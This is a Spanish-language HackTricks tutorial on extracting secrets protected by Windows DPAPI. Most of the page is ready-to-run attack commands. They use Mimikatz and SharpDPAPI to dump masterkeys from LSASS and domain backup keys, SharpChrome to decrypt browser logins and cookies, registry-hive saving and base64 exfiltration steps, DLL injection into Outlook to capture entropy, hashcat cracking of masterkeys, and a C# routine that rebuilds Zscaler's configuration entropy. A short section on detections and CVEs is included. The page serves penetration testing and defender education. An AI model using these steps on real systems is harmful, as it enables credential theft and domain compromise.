# DPAPI - Extracción de contraseñas

{{#include ../../banners/hacktricks-training.md}}



## ¿Qué es DPAPI

La Data Protection API (DPAPI) se utiliza principalmente en el sistema operativo Windows para el **encriptado simétrico de claves privadas asimétricas**, aprovechando secretos de usuario o del sistema como una fuente significativa de entropía. Este enfoque simplifica el cifrado para los desarrolladores al permitirles cifrar datos usando una clave derivada de los secretos de inicio de sesión del usuario o, para cifrado a nivel de sistema, de los secretos de autenticación del dominio del sistema, evitando así que los desarrolladores tengan que gestionar la protección de la clave de cifrado por sí mismos.

La forma más común de usar DPAPI es a través de las funciones **CryptProtectData y CryptUnprotectData**, que permiten a las aplicaciones cifrar y descifrar datos de forma segura con la sesión del proceso que está actualmente logueado. Esto significa que los datos cifrados solo pueden ser descifrados por el mismo usuario o sistema que los cifró.

Además, estas funciones aceptan también un **parámetro `entropy`** que se usará durante el cifrado y descifrado; por lo tanto, para descifrar algo cifrado usando este parámetro, debes proporcionar el mismo valor de entropía que se usó durante el cifrado.

### Generación de la clave de usuario

DPAPI genera una clave única (llamada **`pre-key`**) para cada usuario basada en sus credenciales. Esta clave se deriva de la contraseña del usuario y otros factores y el algoritmo depende del tipo de usuario, pero termina siendo un SHA1. Por ejemplo, para usuarios de dominio, **depende del hash NTLM del usuario**.

Esto es especialmente interesante porque si un atacante puede obtener el hash de la contraseña del usuario, puede:

- **Descifrar cualquier dato que fue cifrado usando DPAPI** con la clave de ese usuario sin necesidad de contactar ninguna API
- Intentar **crackear la contraseña** de forma offline intentando generar la clave DPAPI válida

Además, cada vez que un usuario cifra datos usando DPAPI, se genera una nueva **clave maestra**. Esta clave maestra es la que se usa realmente para cifrar los datos. A cada clave maestra se le asigna un **GUID** (Globally Unique Identifier) que la identifica.

Las claves maestras se almacenan en el directorio **%APPDATA%\Microsoft\Protect\<sid>\<guid>**, donde `{SID}` es el Identificador de seguridad de ese usuario. La clave maestra se almacena cifrada por la **`pre-key`** del usuario y también por una clave de respaldo de dominio para recuperación (así que la misma clave se almacena cifrada 2 veces por 2 rutas diferentes).

Ten en cuenta que la **clave de dominio usada para cifrar la clave maestra está en los domain controllers y nunca cambia**, por lo que si un atacante tiene acceso al domain controller, puede recuperar la clave de respaldo del dominio y descifrar las claves maestras de todos los usuarios del dominio.

Los blobs cifrados contienen el **GUID de la clave maestra** que se usó para cifrar los datos dentro de sus encabezados.

> [!TIP]
> Los blobs cifrados por DPAPI comienzan con **`01 00 00 00`**

Encontrar claves maestras:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

Esta es la clave que usa la máquina para cifrar datos. Está basada en el **DPAPI_SYSTEM LSA secret**, que es una clave especial a la que solo el usuario SYSTEM puede acceder. Esta clave se usa para cifrar datos que deben ser accesibles por el propio sistema, como credenciales a nivel de máquina o secretos a nivel del sistema.

Ten en cuenta que estas claves **no tienen un respaldo de dominio**, por lo que solo son accesibles localmente:

- **Mimikatz** puede acceder a ella volcando LSA secrets usando el comando: `mimikatz lsadump::secrets`
- El secreto se almacena dentro del registro, por lo que un administrador podría **modificar los permisos DACL para acceder a él**. La ruta del registro es: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- También es posible la extracción offline de los registry hives. Por ejemplo, como administrador en el objetivo, guarda los hives y exfíltralos:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Luego, en tu equipo de análisis, recupera el secreto LSA DPAPI_SYSTEM de los hives y úsalo para descifrar blobs de ámbito máquina (contraseñas de tareas programadas, credenciales de servicio, perfiles Wi‑Fi, etc.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Datos protegidos por DPAPI

Entre los datos personales protegidos por DPAPI se encuentran:

- Windows creds
- Contraseñas y datos de autocompletar de Internet Explorer y Google Chrome
- Contraseñas de cuentas de correo electrónico y FTP internas para aplicaciones como Outlook y Windows Mail
- Contraseñas de carpetas compartidas, recursos, redes inalámbricas y Windows Vault, incluidas claves de cifrado
- Contraseñas para conexiones de escritorio remoto, .NET Passport y claves privadas para diversos fines de cifrado y autenticación
- Contraseñas de red gestionadas por Credential Manager y datos personales en aplicaciones que usan CryptProtectData, como Skype, MSN messenger, y más
- Blobs cifrados dentro del registro
- ...

Los datos protegidos por el sistema incluyen:
- Contraseñas de Wifi
- Contraseñas de tareas programadas
- ...

### Opciones para extraer la clave maestra

- Si el usuario tiene privilegios de domain admin, puede acceder a la **domain backup key** para descifrar todas las claves maestras de usuario en el dominio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Con privilegios de administrador local, es posible **acceder a la memoria de LSASS** para extraer las claves maestras de DPAPI de todos los usuarios conectados y la clave SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Si el usuario tiene privilegios de administrador local, puede acceder al **DPAPI_SYSTEM LSA secret** para descifrar las machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Si se conoce la contraseña o el hash NTLM del usuario, puedes **descifrar directamente las claves maestras del usuario**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Si estás dentro de una sesión como el usuario, es posible pedir al DC la **backup key to decrypt the master keys using RPC**. Si eres local admin y el usuario ha iniciado sesión, podrías **steal his session token** para esto:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Listar Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Acceder a datos cifrados por DPAPI

### Encontrar datos cifrados por DPAPI

Los archivos de usuario **comúnmente protegidos** se encuentran en:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- También revisa cambiar `\Roaming\` por `\Local\` en las rutas anteriores.

Ejemplos de enumeración:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) puede encontrar blobs cifrados por DPAPI en el sistema de archivos, el registry y en blobs B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Ten en cuenta que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (del mismo repo) puede usarse para descifrar, usando DPAPI, datos sensibles como cookies.

#### Chromium/Edge/Electron recetas rápidas (SharpChrome)

- Usuario actual: descifrado interactivo de logins/cookies guardados (funciona incluso con Chrome 127+ app-bound cookies porque la clave extra se resuelve desde el Credential Manager del usuario al ejecutarse en contexto de usuario):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Análisis sin conexión cuando solo tienes archivos. Primero extrae la clave de estado AES del perfil’s "Local State" y luego úsala para descifrar el cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage a nivel de dominio/remoto cuando dispones de la clave de respaldo de dominio de DPAPI (PVK) y de admin en el host objetivo:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Si tienes la DPAPI prekey/credkey de un usuario (from LSASS), puedes omitir password cracking y descifrar directamente los datos del perfil:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notas
- Las versiones más recientes de Chrome/Edge pueden almacenar ciertas cookies usando el cifrado "App-Bound". El descifrado sin conexión de esas cookies específicas no es posible sin la app-bound key adicional; ejecuta SharpChrome en el contexto del usuario objetivo para recuperarla automáticamente. Consulta la entrada del blog de seguridad de Chrome referenciada más abajo.

### Claves de acceso y datos

- **Usa SharpDPAPI** para obtener credenciales de archivos cifrados por DPAPI de la sesión actual:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obtener información de credenciales** como los datos cifrados y el guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Descifrar un masterkey de un usuario que solicita la **domain backup key** usando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
La herramienta **SharpDPAPI** también admite estos argumentos para el descifrado de masterkey (fíjate en que es posible usar `/rpc` para obtener la clave de respaldo del dominio, `/password` para usar una contraseña en texto plano, o `/pvk` para especificar un archivo de clave privada de dominio DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Descifrar datos usando una masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
La herramienta **SharpDPAPI** también soporta estos argumentos para el descifrado de `credentials|vaults|rdg|keepass|triage|blob|ps` (ten en cuenta que es posible usar `/rpc` para obtener la clave de respaldo del dominio, `/password` para usar una contraseña en texto plano, `/pvk` para especificar un archivo de clave privada de dominio DPAPI, `/unprotect` para usar la sesión del usuario actual...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Usando un DPAPI prekey/credkey directamente (no se necesita contraseña)

Si puedes volcar LSASS, Mimikatz a menudo expone una per-logon DPAPI key que puede usarse para descifrar las masterkeys del usuario sin conocer la contraseña en texto claro. Pasa este valor directamente al tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Descifrar algunos datos usando la **sesión de usuario actual**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Descifrado sin conexión con Impacket dpapi.py

Si tiene el SID del usuario víctima y la contraseña (o el hash NT), puede descifrar las masterkeys de DPAPI y los blobs de Credential Manager completamente sin conexión usando Impacket’s dpapi.py.

- Identificar artefactos en disco:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Si las herramientas de transferencia de archivos son inestables, base64 los archivos en el host y copie la salida:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Descifrar la masterkey con el SID del usuario y password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Usar el masterkey descifrado para descifrar el credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Este flujo de trabajo a menudo recupera credenciales de dominio guardadas por aplicaciones que usan el Windows Credential Manager, incluidas cuentas administrativas (p. ej., `*_adm`).

---

### Manejo de entropía opcional ("Third-party entropy")

Algunas aplicaciones pasan un valor adicional de **entropía** a `CryptProtectData`. Sin este valor el blob no puede descifrarse, incluso si se conoce la masterkey correcta. Por tanto, obtener la entropía es esencial cuando se atacan credenciales protegidas de esta manera (p. ej., Microsoft Outlook, algunos clientes VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) es una DLL en modo de usuario que hookea las funciones DPAPI dentro del proceso objetivo y registra de forma transparente cualquier entropía opcional que se suministre. Ejecutar EntropyCapture en modo **DLL-injection** contra procesos como `outlook.exe` o `vpnclient.exe` generará un archivo que mapea cada buffer de entropía con el proceso que lo llamó y el blob. La entropía capturada puede luego suministrarse a **SharpDPAPI** (`/entropy:`) o **Mimikatz** (`/entropy:<file>`) para descifrar los datos.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Descifrado de masterkeys sin conexión (Hashcat & DPAPISnoop)

Microsoft introdujo un formato de masterkey **context 3** a partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) añadió hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) y **22102** (context 3), permitiendo el cracking acelerado por GPU de contraseñas de usuarios directamente desde el archivo masterkey. Por lo tanto, los atacantes pueden realizar ataques por word-list o fuerza bruta sin interactuar con el sistema objetivo.

`DPAPISnoop` (2024) automatiza el proceso:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
La herramienta también puede analizar blobs Credential y Vault, descifrarlos con claves crackeadas y exportar contraseñas en texto claro.

### Acceder a datos de otra máquina

En **SharpDPAPI y SharpChrome** puedes indicar la opción **`/server:HOST`** para acceder a los datos de una máquina remota. Por supuesto necesitas poder acceder a esa máquina y en el siguiente ejemplo se supone que se conoce la **clave de cifrado de copia de seguridad del dominio**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Otras herramientas

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) es una herramienta que automatiza la extracción de todos los usuarios y equipos del directorio LDAP y la extracción de la domain controller backup key a través de RPC. El script resolverá las direcciones IP de todos los equipos y realizará un smbclient en todos ellos para recuperar todos los blobs DPAPI de todos los usuarios y desencriptar todo con la domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con la lista de equipos extraída de LDAP puedes encontrar cada subred aunque no las conocieras.

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) puede volcar secretos protegidos por DPAPI automáticamente. El lanzamiento 2.x introdujo:

* Recolección en paralelo de blobs desde cientos de hosts
* Parsing de **context 3** masterkeys e integración automática con Hashcat para cracking
* Soporte para cookies encriptadas "App-Bound" de Chrome (ver la siguiente sección)
* Un nuevo modo **`--snapshot`** para sondear endpoints repetidamente y diferenciar blobs creados recientemente

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) es un parser en C# para archivos masterkey/credential/vault que puede generar formatos para Hashcat/JtR y opcionalmente invocar cracking automáticamente. Soporta completamente los formatos de masterkey de máquina y usuario hasta Windows 11 24H1.


## Detecciones comunes

- Acceso a archivos en `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` y otros directorios relacionados con DPAPI.
- Especialmente desde un recurso compartido de red como **C$** o **ADMIN$**.
- Uso de **Mimikatz**, **SharpDPAPI** u herramientas similares para acceder a la memoria LSASS o volcar masterkeys.
- Evento **4662**: *An operation was performed on an object* – puede correlacionarse con acceso al objeto **`BCKUPKEY`**.
- Evento **4673/4674** cuando un proceso solicita *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilidades & cambios en el ecosistema 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (noviembre 2023). Un atacante con acceso a la red podía engañar a un miembro del dominio para que recuperara una domain backup key maliciosa, permitiendo la desencriptación de masterkeys de usuario. Corregido en el cumulative update de noviembre de 2023; los administradores deben asegurarse de que los DCs y las workstations estén completamente parcheados.
* **Chrome 127 “App-Bound” cookie encryption** (julio 2024) reemplazó la protección legacy basada solo en DPAPI con una clave adicional almacenada en el **Credential Manager** del usuario. La desencriptación offline de cookies ahora requiere tanto el DPAPI masterkey como la **GCM-wrapped app-bound key**. SharpChrome v2.3 y DonPAPI 2.x son capaces de recuperar la clave adicional cuando se ejecutan con contexto de usuario.


### Estudio de caso: Zscaler Client Connector – Entropía personalizada derivada del SID

Zscaler Client Connector guarda varios archivos de configuración en `C:\ProgramData\Zscaler` (p. ej. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Cada archivo está encriptado con **DPAPI (Machine scope)** pero el proveedor suministra una **custom entropy** que se *calcula en tiempo de ejecución* en lugar de almacenarse en disco.

La entropía se reconstruye a partir de dos elementos:

1. Un secreto hard-coded incrustado dentro de `ZSACredentialProvider.dll`.
2. El **SID** de la cuenta de Windows a la que pertenece la configuración.

El algoritmo implementado por la DLL es equivalente a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Debido a que el secreto está incrustado en una DLL que se puede leer desde el disco, **cualquier atacante local con privilegios SYSTEM puede regenerar la entropía para cualquier SID** y descifrar los blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
El descifrado revela la configuración JSON completa, incluyendo cada **comprobación de postura del dispositivo** y su valor esperado – información muy valiosa al intentar bypasses del lado del cliente.

> CONSEJO: los otros artefactos cifrados (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) están protegidos con DPAPI **sin** entropía (`16` bytes de ceros). Por lo tanto, pueden descifrarse directamente con `ProtectedData.Unprotect` una vez obtenidos privilegios SYSTEM.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
